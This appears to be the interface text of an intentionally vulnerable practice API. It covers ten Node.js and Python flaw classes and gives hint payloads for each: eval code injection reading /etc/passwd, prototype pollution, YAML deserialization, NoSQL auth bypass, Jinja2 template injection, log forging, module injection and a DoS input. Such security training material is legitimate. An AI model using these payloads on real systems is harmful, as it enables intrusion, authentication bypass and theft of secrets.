Vulnerable API Tester

Interactively test the vulnerable API endpoints. These simulate vulnerabilities commonly found in both Node.js and Python backends.

1. Unsafe eval() — Code Injection CRITICAL

Node.js: eval() in Express routes  |  Python: eval() / exec()

💡 Hint 
{"expression": "__import__('os').popen('whoami').read()"}
{"expression": "open('/etc/passwd').read()"}
Node.js equiv: {"expression": "require('child_process').execSync('whoami').toString()"}

2. Deep Merge — Prototype Pollution HIGH

Node.js: lodash.merge / deep-extend  |  Python: recursive dict merge

💡 Hint 
Python: {"__class__": {"__init__": {"__globals__": {"config": {"admin": true}}}}}
Node.js: {"__proto__": {"isAdmin": true}}
Try: {"role": "admin", "is_superuser": true}

3. Unsafe YAML Deserialization CRITICAL

Node.js: js-yaml (unsafe load)  |  Python: yaml.load() without SafeLoader

💡 Hint 
Python yaml.load() with FullLoader or Loader:
!!python/object/apply:os.popen
  args: ['whoami']

Node.js js-yaml (old versions):
"toString": ! "function() { return require('child_process').execSync('whoami'); }"

4. NoSQL Injection (Simulated) HIGH

Node.js: MongoDB $gt/$ne operators  |  Python: PyMongo query injection

💡 Hint 
Bypass auth with operator injection:
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

5. API Template Injection CRITICAL

Node.js: EJS/Pug/Nunjucks  |  Python: Jinja2/Mako

💡 Hint 
Jinja2: {"name": "{{ config }}", "greeting": "{{ ''.__class__.__mro__[1].__subclasses__() }}"}
EJS:    {"name": "<%= process.env %>"}
Try:    {"name": "{{ 7*7 }}"}

6. Log Injection / Log Forging MEDIUM

Node.js: console.log() with user input  |  Python: logging.info()

💡 Hint 
Inject fake log entries:
{"action": "login", "user": "admin\\n[INFO] User admin granted superuser"}
{"action": "login\\n[CRITICAL] System compromised", "user": "hacker"}

CRLF in logs can forge audit trails or inject malicious entries.

7. Insecure Randomness MEDIUM

Node.js: Math.random()  |  Python: random.random()

💡 Hint 
Tokens are generated with Python's random module (Mersenne Twister).
Not cryptographically secure! With ~624 outputs you can predict future tokens.
Node.js Math.random() uses xorshift128+ — also predictable.
Should use: secrets.token_hex() (Python) or crypto.randomBytes() (Node.js)

8. Dynamic Import / Module Injection CRITICAL

Node.js: require(userInput)  |  Python: __import__(userInput)

💡 Hint 
Import dangerous modules:
{"module": "os", "function": "popen", "args": ["whoami"]}
{"module": "subprocess", "function": "getoutput", "args": ["id"]}
Node.js: require('child_process').execSync('id')

9. DoS — Unbounded Input Processing HIGH

Node.js: No body size limit  |  Python: No payload validation

💡 Hint 
Send massive payloads:
{"data": "A", "repeat": 999999999}

Or deeply nested JSON:
{"a":{"a":{"a":{"a":{"a":{"a":"deep"}}}}}}

No input size limits, no rate limiting, no timeout.
Can exhaust server memory or CPU.

10. Hardcoded Secrets / Config Exposure MEDIUM

Node.js: process.env in response  |  Python: app.config exposed

💡 Hint 
This endpoint exposes internal configuration including:
- Database credentials
- API keys
- Secret keys
- Debug flags

In Node.js: process.env leak
In Python: app.config or os.environ leak
Never expose config endpoints in production!
